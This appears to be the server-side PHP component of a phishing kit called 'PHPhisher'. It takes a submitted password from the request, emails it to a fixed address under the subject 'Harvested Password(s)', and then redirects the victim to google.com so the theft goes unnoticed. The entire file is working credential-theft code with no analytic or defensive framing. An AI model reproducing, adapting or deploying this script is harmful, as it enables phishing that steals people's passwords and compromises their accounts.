<?php
$password = $_GET['password'];

$subject ="Harvested Password(s) (Connection_Reset_Template)";
$message="Password: $password";
$header="from: PHPhisher";
$to ='test@test.com';

if (!$password){
echo '<script script type="text/javascript">';
echo 'window.location.href ="index.html";'; 
echo '</script>';
}
else{
echo '<script script type="text/javascript">';
echo 'window.location.href ="http://google.com/";'; 
echo '</script>';
mail($to,$subject,$message,$header);
}
?>